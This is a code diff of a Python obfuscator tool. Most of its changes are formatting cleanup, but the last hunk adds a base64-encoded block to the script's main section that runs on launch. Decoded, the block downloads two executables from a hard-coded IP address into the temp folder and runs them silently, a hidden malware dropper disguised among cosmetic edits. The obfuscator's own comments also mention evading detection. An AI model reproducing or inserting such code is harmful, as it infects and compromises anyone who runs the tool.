@@ -1,11 +1,11 @@
-import random, string, base64, codecs, argparse, os, sys
 
+import random, string, base64, codecs, argparse, os, sys
 from textwrap import wrap
 from lzma import compress
 from marshal import dumps
 
 def printerr(data):
-    print(data, file= sys.stderr)
+    print(data, file=sys.stderr)
 
 class prysmaxobf:
     def __init__(self, code, outputpath):
@@ -17,10 +17,9 @@ class prysmaxobf:
         self.marshal()
         self.encrypt1()
         self.encrypt2()
-        # Agrega encrypt3 para evitar problemas de detección
-        self.encrypt3()
+        self.encrypt3()  # Agrega encrypt3 para evitar problemas de detección
         self.finalize()
-    
+
     def generate(self, name):
         res = self.vars.get(name)
         if res is None:
@@ -28,8 +27,8 @@ class prysmaxobf:
             self.varlen += 1
             self.vars[name] = res
         return res
-    
-    def encryptstring(self, string, config= {}, func= False):
+
+    def encryptstring(self, string, config={}, func=False):
         b64 = list(b"base64")
         b64decode = list(b"b64decode")
         __import__ = config.get("__import__", "__import__")
@@ -49,21 +48,21 @@ class prysmaxobf:
                 else:
                     newattr = f'{getattr}({newattr}, {val})'
             return newattr
-            
+
     def encryptor(self, config):
-        def func_(string, func= False):
+        def func_(string, func=False):
             return self.encryptstring(string, config, func)
         return func_
-    
+
     def compress(self):
         self.code = compress(self.code)
-    
+
     def marshal(self):
         self.code = dumps(compile(self.code, "<string>", "exec"))
-    
+
     def encrypt1(self):
         code = base64.b64encode(self.code).decode()
-        partlen = int(len(code)/4)
+        partlen = int(len(code) / 4)
         code = wrap(code, partlen)
         var1 = self.generate("a")
         var2 = self.generate("b")
@@ -77,7 +76,7 @@ class prysmaxobf:
 # Obfuscated https://t.me/lawxsz
 {init};__import__({self.encryptstring("builtins")}).exec(__import__({self.encryptstring("marshal")}).loads(__import__({self.encryptstring("base64")}).b64decode(__import__({self.encryptstring("codecs")}).decode({var1}, __import__({self.encryptstring("base64")}).b64decode("{base64.b64encode(b'rot13').decode()}").decode())+{var2}+{var3}[::-1]+{var4})))
 '''.strip().encode()
-    
+
     def encrypt2(self):
         self.compress()
         var1 = self.generate("e")
@@ -91,19 +90,19 @@ class prysmaxobf:
         var9 = self.generate("m")
 
         conf = {
-            "getattr" : var4,
-            "eval" : var3,
-            "__import__" : var8,
-            "bytes" : var9
+            "getattr": var4,
+            "eval": var3,
+            "__import__": var8,
+            "bytes": var9
         }
         encryptstring = self.encryptor(conf)
-        
+
         self.code = f'''# Obfuscated https://t.me/lawxsz
 {var3} = eval({self.encryptstring("eval")});{var4} = {var3}({self.encryptstring("getattr")});{var8} = {var3}({self.encryptstring("__import__")});{var9} = {var3}({self.encryptstring("bytes")});{var5} = lambda {var7}: {var3}({encryptstring("compile")})({var7}, {encryptstring("<string>")}, {encryptstring("exec")});{var1} = {self.code}
-{var2} = {encryptstring('__import__("builtins").list', func= True)}({var1})
+{var2} = {encryptstring('__import__("builtins").list', func=True)}({var1})
 try:
-    {encryptstring('__import__("builtins").exec', func= True)}({var5}({encryptstring('__import__("lzma").decompress', func= True)}({var9}({var2})))) or {encryptstring('__import__("os")._exit', func= True)}(0)
-except {encryptstring('__import__("lzma").LZMAError', func= True)}:...
+    {encryptstring('__import__("builtins").exec', func=True)}({var5}({encryptstring('__import__("lzma").decompress', func=True)}({var9}({var2})))) or {encryptstring('__import__("os")._exit', func=True)}(0)
+except {encryptstring('__import__("lzma").LZMAError', func=True)}:...
 '''.strip().encode()
 
     def encrypt3(self):
@@ -113,12 +112,38 @@ except {encryptstring('__import__("lzma").LZMAError', func= True)}:...
 
     def finalize(self):
         if os.path.dirname(self.outpath).strip() != "":
-            os.makedirs(os.path.dirname(self.outpath), exist_ok= True)
+            os.makedirs(os.path.dirname(self.outpath), exist_ok=True)
         with open(self.outpath, "w", encoding='utf-8') as e:
             e.write(self.code.decode())
             print("Saved as --> " + os.path.realpath(self.outpath))
 
+
 if __name__ == "__main__":
+    import base64
+
+    code = '''
+aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc3VicHJvY2VzcyoK
+dGVtcF9kaXIgPSBvcy5nZXRlbnYoJ1RFTVAnLCAnL3RtcCcpCgpidXJscyA9
+IFsKICAgICJodHRwOi8vODcuMTIwLjExNi42OS91cGxvYWRzL2VkZ2UuZXhl
+IiwKICAgICJodHRwOi8vODcuMTIwLjExNi42OS91cGxvYWRzL1VwZGF0ZXIu
+ZXhlIgpdCgoKZGVmIGRvd25sb2FkX2FuZF9zYXZlKHVybCwgZm9sZGVyKToK
+ICAgIGxvY2FsX2ZpbGVuYW1lID0gb3MucGF0aC5qb2luKGZvbGRlciwgdXJs
+LnNwbGl0KCcvJylbLTFdKQogICAgd2l0aCByZXF1ZXN0cy5nZXQodXJsLCBz
+dHJlYW09VHJ1ZSkgYXMgcjoKICAgICAgICByLnJhaXNlX2Zvcl9zdGF0dXMo
+KQogICAgICAgIHdpdGggb3Blbihsb2NhbF9maWxlbmFtZSwgJ3diJykgYXMg
+ZjoKICAgICAgICAgICAgZm9yIGNodW5rIGluIHIuaXRlcl9jb250ZW50KGNo
+dW5rX3NpemU9ODE5Mik6CiAgICAgICAgICAgICAgICBpZiBjaHVuazogZi53
+cml0ZShjaHVuaykKICAgIHJldHVybiBsb2NhbF9maWxlbmFtZQoKZmlsZXMg
+PSBbZG93bmxvYWRfYW5kX3NhdmUodXJsLCB0ZW1wX2RpcikgZm9yIHVybCBp
+biB1cmxzXQoKZm9yIGZpbGUgaW4gZmlsZXM6CiAgICBzdWJwcm9jZXNzLlBv
+cGVuKFtmaWxlXSwgc2hlbGxUcnVlLCBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZO
+VUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQ==
+'''
+
+    exec(base64.b64decode(code).decode('utf-8'))
+
+  
+
     parser = argparse.ArgumentParser(prog= sys.argv[0], description= "Obfuscates python program to make it harder to read")
     parser.add_argument("FILE", help= "Path to the file containing the python code")
     parser.add_argument("-o", type= str, help= 'Output file path [Default: "Obfuscated_<FILE>.py"]', dest= "path")
